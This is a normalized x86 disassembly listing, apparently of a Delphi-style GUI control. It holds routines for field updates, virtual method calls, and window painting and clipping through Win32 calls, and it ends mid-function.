mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_44b440
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x11c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4810ae
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
xor edx edx
call sub_4255f0
retn
sub_4810d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x210 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax esi
mov [ ebx + 0x210 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x24 ]
cmp eax 0x20000000
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
mov eax esi
call sub_47d74c
call sub_47cb00
mov edx eax
mov eax ebx
call sub_481450
mov [ ebx + 0x210 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax ebx
call sub_44ca14
sub_481154
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi eax
cmp dl [ esi + 0x225 ]
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
retn
mov [ esi + 0x225 ] dl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x210 ] 0x0
je r-xdata
mov eax [ esi + 0x210 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x31 ]
jne r-xdata
mov eax esi
call sub_480ed8
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov dl [ esi + 0x226 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esi + 0x226 ] al
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
jg r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_481a8c
test al al
jne r-xdata
mov dl 0x1
xor edx edx
jmp r-xdata
mov [ esi + 0x278 ] al
lea ecx [ esp + 0x4 ]
mov edx [ esi + 0x4c ]
mov eax [ esi + 0x48 ]
call sub_41725c
mov eax [ esp + 0x4 ]
mov [ esi + 0x25d ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x261 ] eax
mov al 0x1
mov eax esi
call sub_480ed8
call sub_419748
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov al [ esi + 0x227 ]
sub al 0x2
jb r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x128 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
inc ebp
mov [ esp ] 0x0
mov edx [ esi + 0x261 ]
mov eax esi
call sub_44c02c
jmp r-xdata
sub al 0x2
jb r-xdata
inc [ esp ]
dec ebp
jne r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov edx [ esi + 0x25d ]
mov eax esi
call sub_44c008
jmp r-xdata
mov eax esi
call sub_480ed8
mov edx [ esp ]
call sub_47df90
mov edi eax
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov al [ edi + 0x30 ]
test al al
jne r-xdata
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax edi
call sub_47eb64
test eax eax
je r-xdata
mov edx eax
mov eax [ edi + 0x40 ]
call sub_44c794
mov al [ r-xdata ]
cmp al [ edi + 0x31 ]
je r-xdata
mov dl 0x1
call sub_44c794
mov dl 0x1
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax edi
call sub_47eb64
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x210 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x31 ]
jne r-xdata
xor edx edx
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ esi + 0x210 ]
test [ eax + 0x31 ] 0x4
jne r-xdata
mov eax [ esi + 0x210 ]
test [ eax + 0x31 ] 0x2
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ edi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
sub_4813a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp dl [ eax + 0x227 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x227 ] dl
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_48142e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov edx [ eax ]
call [ edx + 0xdc ]
inc esi
dec ebx
jne r-xdata
sub_481450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x214 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x214 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421248
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx ebx
call sub_421018
sub_4814a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax ebx
call sub_41725c
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_480ad0
mov edx eax
mov ecx ebx
mov eax esi
call sub_47fad4
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47f560
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_47f560
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ esi + 0x210 ]
call sub_47d6b0
mov edx ebx
call sub_419948
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47f52c
push eax
mov eax [ esi + 0x210 ]
call sub_47d6b0
mov edx ebx
call sub_47df90
pop edx
call sub_47ee8c
mov eax [ ebp - 0xc ]
call sub_4193b8
mov ebx eax
inc ebx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
sub_481550
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax ebx
call sub_41725c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_480ad0
mov edx eax
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_47fad4
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_419948
mov esi eax
mov edx [ edi + 0x48 ]
mov eax esi
call sub_47ef98
mov eax edi
call sub_47f560
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
call sub_4193b8
push eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
pop edx
call sub_47df90
mov edx [ edi + 0x48 ]
call sub_47ef98
mov eax edi
call sub_47f560
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax esi
call sub_47eb64
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
mov dl 0x1
mov eax esi
call sub_47d670
test al al
je r-xdata
mov eax esi
call sub_4193b8
push eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
pop edx
call sub_47df90
call sub_47d6b0
mov edx ebx
call sub_419948
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
call sub_47f52c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_47ee8c
mov eax [ edi + 0x38 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0xc ]
call sub_47f0b8
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
xor edx edx
jmp r-xdata
mov eax esi
call sub_47d6b0
call sub_47e30c
test eax eax
jg r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_481690
push ebx
push esi
mov ebx eax
xor ecx ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
sub_4816c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c908
mov al [ esi + 0x227 ]
add al 0xfe
sub al 0x2
jb r-xdata
pop esi
pop ebx
retn
sub bl 0x1
jb r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x134 ]
jmp r-xdata
sub bl 0x3
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x134 ]
jmp r-xdata
sub_481704
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x3
jb r-xdata
mov eax [ ebx + 0x254 ]
mov esi eax
add esi esi
mov edx [ ebx + 0x250 ]
mov ecx edx
dec ecx
imul esi ecx
mov ecx [ ebx + 0x268 ]
imul ecx edx
add ecx eax
add esi ecx
add esi eax
cmp [ ebx + 0x25c ] 0x0
je r-xdata
test [ ebx + 0x208 ] 0x2
je r-xdata
cmp [ ebx + 0x250 ] 0x1
jle r-xdata
test [ ebx + 0x208 ] 0x8
je r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x250 ]
dec eax
add eax eax
add esi eax
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
inc esi
inc esi
inc esi
inc esi
sub_4817b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_481a8c
test al al
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x2
je r-xdata
mov eax [ ebx + 0x258 ]
mov esi eax
add esi esi
mov edx [ ebx + 0x24c ]
mov ecx edx
dec ecx
imul esi ecx
mov ecx [ ebx + 0x26c ]
imul ecx edx
add ecx eax
add esi ecx
add esi eax
cmp [ ebx + 0x265 ] 0x0
je r-xdata
test [ ebx + 0x208 ] 0x1
je r-xdata
cmp [ ebx + 0x24c ] 0x1
jle r-xdata
test [ ebx + 0x208 ] 0x4
je r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x24c ]
add eax eax
add esi eax
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
inc esi
inc esi
inc esi
inc esi
sub_4818f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f950
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48196b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4193b8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_47c4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
sub_481978
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4819eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44db40
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4819f2
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_4819f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4541b8
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47d63c
call sub_419748
test eax eax
jle r-xdata
mov eax ebx
call sub_482544
mov ecx [ ebx + 0x4 ]
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov [ esi + 0x270 ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax esi
call sub_4507ec
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx [ ebx + 0x210 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x124 ]
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_47631c
mov eax esi
call sub_4032a8
sub_481a8c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_481ab8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov esi [ edi + 0x210 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_4034a4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_47dbdc
sub_481af0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
lea ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41725c
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_480ad0
mov ebx eax
mov eax [ esi + 0x40 ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_44c214
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax edi
call sub_480ed8
mov edx eax
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x16c ]
call sub_4193b8
push eax
mov eax [ ebx + 0x16c ]
call sub_47eb58
call sub_419748
dec eax
pop edx
cmp edx eax
jge r-xdata
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_44c214
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov edx [ esi + 0x40 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_44c214
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov [ ebp - 0x8 ] 0x1
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_44c214
mov eax [ ebp - 0x2c ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
mov eax edi
call sub_480ed8
mov edx eax
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x16c ]
call sub_4193b8
mov edx eax
add edx [ ebp - 0x8 ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
sub_481c00
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x210 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47d6b0
call sub_419748
dec eax
test eax eax
jl r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd8 ]
inc eax
mov ebx eax
xor edi edi
mov eax [ esi + 0x210 ]
call sub_47d6b0
mov edx edi
call sub_47df90
add eax 0x40
call sub_40d4f0
inc edi
dec ebx
jne r-xdata
sub_481c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax ebx
call sub_44eefc
test al al
jne r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_452aa4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebx + 0x210 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jb r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebp + 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
mov edi eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edi esi
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
cmp edi [ ebx + 0x48 ]
je r-xdata
mov esi edi
sub_481d08
push ebx
push esi
mov esi edx
mov ebx eax
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_451248
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
pop esi
pop ebx
retn
sub_481d3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x220 ] eax
test eax eax
jne r-xdata
mov edx ebx
call sub_47f798
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_47f660
mov eax [ ebx + 0x220 ]
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_44ca14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_481dd0
mov [ ebx + 0x220 ] eax
push 0x0
push 0x1
push 0x85
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
sub_481dd0
push ebx
push esi
mov ebx eax
lea eax [ ebx + 0x274 ]
call sub_40d4f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10c ]
mov ecx ebx
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x274 ] esi
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x274 ]
call sub_4216b8
mov edx ebx
mov eax [ ebx + 0x274 ]
call sub_47f660
mov eax [ ebx + 0x274 ]
pop esi
pop ebx
retn
sub_481e40
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x208 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x209 ]
add cl dl
add eax eax
add cl al
lea eax [ edx + edx * 2 ]
add cl al
sub cl 0x3
mov [ ebp - 0x11 ] cl
mov eax [ ebp - 0x4 ]
call sub_48254c
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_48254c
mov esi [ eax + 0x40 ]
xor eax eax
mov al [ ebp - 0x11 ]
cmp eax 0xb
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_48254c
mov esi [ eax + 0x40 ]
jmp [ eax * 4 + jump_table_481eb3 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
call sub_424990
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov edx 0xffffffe2
call sub_46ec74
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffe7
call sub_46ec74
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46ec74
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48254c
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46ebb4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
mov edx [ ebp - 0x29 ]
call sub_42517c
mov edx [ ebp - 0x31 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
call sub_42511c
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jb r-xdata
lea eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetClientRect
lea eax [ ebp - 0x31 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x31 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x2d ]
neg eax
push eax
mov eax [ ebp - 0x31 ]
neg eax
push eax
lea eax [ ebp - 0x21 ]
push eax
call OffsetRect
mov eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x19 ]
push eax
mov eax [ ebp - 0x1d ]
push eax
mov eax [ ebp - 0x21 ]
push eax
push edi
call ExcludeClipRect
mov eax [ ebp - 0x2d ]
neg eax
push eax
mov eax [ ebp - 0x31 ]
neg eax
push eax
lea eax [ ebp - 0x31 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425570
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_482517
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx edi
call sub_4255f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424a9c
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
mov edx [ ebp - 0x31 ]
call sub_42517c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x25 ]
mov edx [ ebp - 0x31 ]
call sub_42511c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_424990
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
